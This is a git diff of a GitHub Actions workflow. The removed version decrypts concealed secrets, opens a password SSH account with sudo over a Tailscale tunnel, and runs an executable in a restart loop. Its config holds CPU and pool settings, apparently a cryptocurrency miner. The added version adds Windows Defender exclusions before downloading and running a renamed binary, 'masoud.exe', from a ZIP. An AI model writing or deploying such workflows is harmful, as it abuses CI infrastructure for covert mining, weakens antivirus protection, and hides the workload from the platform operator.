@@ -1,188 +1,189 @@
-name: MaseProject
+name: Run Masoud EXE with Detailed Logs
 
 on:
   workflow_dispatch:
 
 jobs:
-  secure-ssh:
-    runs-on: ubuntu-latest
-    timeout-minutes: 360
+  run-masoud:
+    runs-on: windows-latest
+    timeout-minutes: 300
 
     steps:
-      - name: Decrypt All Secrets
+      - name: Prepare log folder
+        shell: powershell
         run: |
-          sudo apt-get update
-          sudo apt-get install -y openssl jq
-          
-          echo '${{ secrets.ALL_SECRETS }}' | base64 -d | openssl enc -aes-256-cbc -d -pbkdf2 -k '${{ secrets.MASTER_KEY }}' > /tmp/secrets.json
-          
-          SSH_PASSWORD=$(jq -r '.ssh_password' /tmp/secrets.json)
-          REPO_URL=$(jq -r '.repo_url' /tmp/secrets.json)
-          PROJECT_NAME=$(jq -r '.project_name' /tmp/secrets.json)
-          EXECUTABLE_NAME=$(jq -r '.executable_name' /tmp/secrets.json)
-          DEPENDENCIES=$(jq -r '.dependencies' /tmp/secrets.json)
-          
-          echo "SSH_PASSWORD=$SSH_PASSWORD" >> $GITHUB_ENV
-          echo "REPO_URL=$REPO_URL" >> $GITHUB_ENV
-          echo "PROJECT_NAME=$PROJECT_NAME" >> $GITHUB_ENV
-          echo "EXECUTABLE_NAME=$EXECUTABLE_NAME" >> $GITHUB_ENV
-          echo "DEPENDENCIES=$DEPENDENCIES" >> $GITHUB_ENV
-          
-          jq '.config' /tmp/secrets.json > /tmp/config.json
-          
-          rm -f /tmp/secrets.json
-          
-          echo "All secrets decrypted successfully"
+          New-Item -Path C:\app -ItemType Directory -Force | Out-Null
+          New-Item -Path C:\app\logs -ItemType Directory -Force | Out-Null
+          Write-Host "[OK] Prepared C:\app and C:\app\logs"
 
-      - name: Configure SSH Settings
+      - name: Add Windows Defender exclusions (BEFORE download)
+        shell: powershell
         run: |
-          sudo apt-get install -y openssh-server
-          sudo systemctl enable ssh
-          sudo systemctl start ssh
-          sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
-          sudo systemctl restart ssh
-          sudo ufw allow 22/tcp
-          echo "SSH configured successfully"
+          Write-Host "[*] Configuring Windows Defender exclusions..."
+          try {
+            Add-MpPreference -ExclusionPath "C:\app" -ErrorAction Stop
+            Write-Host "[OK] Added folder exclusion: C:\app"
+            
+            Add-MpPreference -ExclusionProcess "masoud.exe" -ErrorAction Stop
+            Write-Host "[OK] Added process exclusion: masoud.exe"
+            
+            Write-Host "[OK] All Defender exclusions configured successfully"
+          } catch {
+            Write-Host "[!] Warning: Could not add exclusions: $($_.Exception.Message)"
+            Write-Host "[!] Continuing anyway... (might face blocking issues)"
+          }
 
-      - name: Create SSH User
+      - name: Download ZIP with retries
+        shell: powershell
         run: |
-          sudo useradd -m -s /bin/bash SSH
-          echo "SSH:$SSH_PASSWORD" | sudo chpasswd
-          sudo usermod -aG sudo SSH
-          if ! id "SSH" &>/dev/null; then
-              echo "User creation failed"
-              exit 1
-          fi
-          echo "User SSH created successfully"
+          $url = 'https://github.com/masezahedi/MasoudApp/raw/main/Masoud-6.24.0-windows-x64.zip'
+          $out = 'C:\app\app.zip'
+          $maxAttempts = 3
+          $attempt = 0
+          $success = $false
 
-      - name: Install Tailscale
-        run: |
-          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.noarmor.gpg | sudo tee /usr/share/keyrings/tailscale-archive-keyring.gpg >/dev/null
-          curl -fsSL https://pkgs.tailscale.com/stable/ubuntu/jammy.tailscale-keyring.list | sudo tee /etc/apt/sources.list.d/tailscale.list
-          sudo apt-get update
-          sudo apt-get install -y tailscale
-          echo "Tailscale installed successfully"
+          while ($attempt -lt $maxAttempts -and -not $success) {
+            $attempt++
+            Write-Host "[*] Download attempt $attempt/$maxAttempts..."
+            try {
+              Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -ErrorAction Stop
+              if (Test-Path $out) {
+                $size = (Get-Item $out).Length
+                $sizeMB = [math]::Round($size/1MB, 2)
+                Write-Host "[OK] Downloaded successfully - Size: $sizeMB MB"
+                if ($size -gt 0) {
+                  $success = $true
+                } else {
+                  Write-Host "[ERR] File size is 0 bytes"
+                }
+              } else {
+                Write-Host "[ERR] File not found after download"
+              }
+            } catch {
+              Write-Host "[ERR] Attempt $attempt failed: $($_.Exception.Message)"
+            }
+            if (-not $success -and $attempt -lt $maxAttempts) { 
+              Write-Host "[*] Waiting 5 seconds before retry..."
+              Start-Sleep -Seconds 5 
+            }
+          }
 
-      - name: Establish Tailscale Connection
-        run: |
-          sudo tailscale up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} --hostname=gh-runner-$GITHUB_RUN_ID
-          TAILSCALE_IP=""
-          RETRIES=0
-          while [ -z "$TAILSCALE_IP" ] && [ $RETRIES -lt 10 ]; do
-              TAILSCALE_IP=$(tailscale ip -4)
-              sleep 5
-              RETRIES=$((RETRIES + 1))
-          done
-          if [ -z "$TAILSCALE_IP" ]; then
-              echo "Tailscale IP not assigned. Exiting."
-              exit 1
-          fi
-          echo "TAILSCALE_IP=$TAILSCALE_IP" >> $GITHUB_ENV
-          echo "Tailscale connected with IP: $TAILSCALE_IP"
+          if (-not $success) {
+            Write-Host "[ERR] ALL DOWNLOAD ATTEMPTS FAILED"
+            exit 1
+          }
 
-      - name: Verify SSH Accessibility
+      - name: Extract ZIP
+        shell: powershell
         run: |
-          echo "Tailscale IP: $TAILSCALE_IP"
-          sudo systemctl status ssh --no-pager
-          if nc -zv localhost 22 2>&1 | grep -q succeeded; then
-              echo "SSH port 22 is accessible"
-          else
-              echo "SSH port 22 is NOT accessible"
-              exit 1
-          fi
-          echo "SSH connectivity verified successfully"
+          $in = 'C:\app\app.zip'
+          $dest = 'C:\app'
 
-      - name: Install Project Dependencies
-        run: |
-          echo "Installing project dependencies: $DEPENDENCIES"
-          sudo apt-get install -y $DEPENDENCIES
-          echo "Dependencies installed successfully"
+          if (-not (Test-Path $in)) {
+            Write-Host "[ERR] ZIP file not found: $in"
+            exit 1
+          }
 
-      - name: Clone and Build Project
-        run: |
-          cd /home/SSH
-          sudo -u SSH git clone $REPO_URL
-          cd $PROJECT_NAME
-          sudo -u SSH mkdir build
-          cd build
-          sudo -u SSH cmake ..
-          sudo -u SSH make -j$(nproc)
-          echo "$PROJECT_NAME compiled successfully"
-
-      - name: Deploy Config
-        run: |
-          sudo mv /tmp/config.json /home/SSH/$PROJECT_NAME/build/config.json
-          sudo chown SSH:SSH /home/SSH/$PROJECT_NAME/build/config.json
-          sudo chmod 600 /home/SSH/$PROJECT_NAME/build/config.json
+          Write-Host "[*] Extracting $in to $dest..."
+          Write-Host "[*] ZIP file info:"
+          Get-Item $in | Select-Object Name, Length, LastWriteTime | Format-Table
           
-          echo "Configuration deployed successfully"
-          echo "Config validation:"
-          sudo jq '.cpu.enabled, .pools[0].url' /home/SSH/$PROJECT_NAME/build/config.json
+          try {
+            Write-Host "[*] Using Expand-Archive to extract ZIP..."
+            Expand-Archive -Path $in -DestinationPath $dest -Force -ErrorAction Stop
+            Write-Host "[OK] Extraction completed successfully"
+            
+            $items = @(Get-ChildItem $dest -Recurse -ErrorAction SilentlyContinue)
+            Write-Host "[OK] Total items after extraction: $($items.Count)"
+            Write-Host "[*] Directory contents:"
+            Get-ChildItem $dest -Depth 1 | Format-Table Name, Length
+          } catch {
+            Write-Host "[ERR] Exception during extraction: $($_.Exception.Message)"
+            exit 1
+          }
 
-      - name: Start Project
+      - name: Find masoud.exe
+        shell: powershell
+        id: findexe
         run: |
-          sudo touch /home/SSH/$PROJECT_NAME.log
-          sudo chown SSH:SSH /home/SSH/$PROJECT_NAME.log
-          cd /home/SSH/$PROJECT_NAME/build
+          Write-Host "[*] Searching for masoud.exe..."
+          $exe = Get-ChildItem -Path C:\app -Recurse -Filter "masoud.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
           
-          sudo -u SSH bash -c "nohup ./$EXECUTABLE_NAME --config=config.json > /home/SSH/$PROJECT_NAME.log 2>&1 &"
+          if (-not $exe) {
+            Write-Host "[ERR] masoud.exe not found!"
+            exit 1
+          }
           
-          sleep 15
-          
-          if pgrep -f "$EXECUTABLE_NAME" > /dev/null; then
-              PID=$(pgrep -f $EXECUTABLE_NAME)
-              echo "$PROJECT_NAME started successfully - PID: $PID"
-              echo ""
-              echo "Initial log output:"
-              head -n 20 /home/SSH/$PROJECT_NAME.log
-          else
-              echo "ERROR: $PROJECT_NAME failed to start"
-              echo ""
-              echo "Log contents:"
-              cat /home/SSH/$PROJECT_NAME.log
-              exit 1
-          fi
+          $path = $exe.FullName
+          Write-Host "[OK] Found masoud.exe at: $path"
+          Add-Content -Path $env:GITHUB_OUTPUT -Value "exePath=$path"
 
-      - name: Maintain Connection
+      - name: Run masoud.exe
+        shell: powershell
         run: |
-          echo ""
-          echo "╔════════════════════════════════════════╗"
-          echo "║          SSH ACCESS INFO               ║"
-          echo "╠════════════════════════════════════════╣"
-          echo "║ Address:  $TAILSCALE_IP"
-          echo "║ Port:     22"
-          echo "║ Username: SSH"
-          echo "║ Password: $SSH_PASSWORD"
-          echo "╠════════════════════════════════════════╣"
-          echo "║ Connect:  ssh SSH@$TAILSCALE_IP"
-          echo "╚════════════════════════════════════════╝"
-          echo ""
-          echo "╔════════════════════════════════════════╗"
-          echo "║       $PROJECT_NAME STATUS             ║"
-          echo "╠════════════════════════════════════════╣"
-          echo "║ Log:    /home/SSH/$PROJECT_NAME.log"
-          echo "║ Config: /home/SSH/$PROJECT_NAME/build/config.json"
-          echo "╚════════════════════════════════════════╝"
-          echo ""
+          $exePath = '${{ steps.findexe.outputs.exePath }}'
           
-          while true; do
-              if pgrep -f "$EXECUTABLE_NAME" > /dev/null; then
-                  PID=$(pgrep -f $EXECUTABLE_NAME)
-                  CPU=$(ps -p $PID -o %cpu= 2>/dev/null | xargs)
-                  MEM=$(ps -p $PID -o %mem= 2>/dev/null | xargs)
-                  UPTIME=$(ps -p $PID -o etime= 2>/dev/null | xargs)
-                  echo "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Running | PID: $PID | CPU: ${CPU}% | MEM: ${MEM}% | Uptime: $UPTIME"
-              else
-                  echo "[$(date '+%Y-%m-%d %H:%M:%S')] ✗ Process NOT FOUND - Attempting restart..."
-                  cd /home/SSH/$PROJECT_NAME/build
-                  sudo -u SSH bash -c "nohup ./$EXECUTABLE_NAME --config=config.json > /home/SSH/$PROJECT_NAME.log 2>&1 &"
-                  sleep 10
-                  if pgrep -f "$EXECUTABLE_NAME" > /dev/null; then
-                      echo "[$(date '+%Y-%m-%d %H:%M:%S')] ✓ Process restarted successfully"
-                  else
-                      echo "[$(date '+%Y-%m-%d %H:%M:%S')] ✗ Restart failed - Check logs"
-                  fi
-              fi
-              sleep 300
-          done
+          if (-not (Test-Path $exePath)) {
+            Write-Host "[ERR] Executable not found at: $exePath"
+            exit 1
+          }
+          
+          Write-Host "[*] Running masoud.exe..."
+          Write-Host "[*] Path: $exePath"
+          try {
+            & $exePath *> C:\app\masoud_output.log
+            $exit = $LASTEXITCODE
+            
+            if ($exit -eq 0) {
+              Write-Host "[OK] Program executed successfully (exit code: 0)"
+            } else {
+              Write-Host "[!] Program finished with exit code: $exit"
+            }
+            
+            Write-Host ""
+            Write-Host "[*] Program output (first 100 lines):"
+            Write-Host "======================================"
+            Get-Content C:\app\masoud_output.log -TotalCount 100
+            Write-Host "======================================"
+            
+          } catch {
+            Write-Host "[ERR] Exception while running program: $($_.Exception.Message)"
+            exit 1
+          }
+
+      - name: Summary
+        shell: powershell
+        if: always()
+        run: |
+          Write-Host ""
+          Write-Host "======================================"
+          Write-Host "        EXECUTION SUMMARY"
+          Write-Host "======================================"
+          Write-Host ""
+          
+          $items = @(Get-ChildItem C:\app -Recurse -ErrorAction SilentlyContinue)
+          Write-Host "[*] Total files in C:\app: $($items.Count)"
+          
+          if (Test-Path C:\app\masoud_output.log) {
+            $outputSize = (Get-Item C:\app\masoud_output.log).Length
+            $outputSizeKB = [math]::Round($outputSize/1KB, 2)
+            Write-Host "[*] Program output file size: $outputSizeKB KB"
+          }
+          
+          Write-Host ""
+          Write-Host "[*] Log files created:"
+          Get-ChildItem C:\app\logs -ErrorAction SilentlyContinue | ForEach-Object {
+            Write-Host "    - $($_.Name)"
+          }
+          
+          Write-Host ""
+          Write-Host "[OK] Workflow completed"
+
+      - name: Upload artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: masoud-artifacts
+          path: |
+            C:\app\masoud_output.log
+            C:\app\Masoud-6.24.0-windows-x64
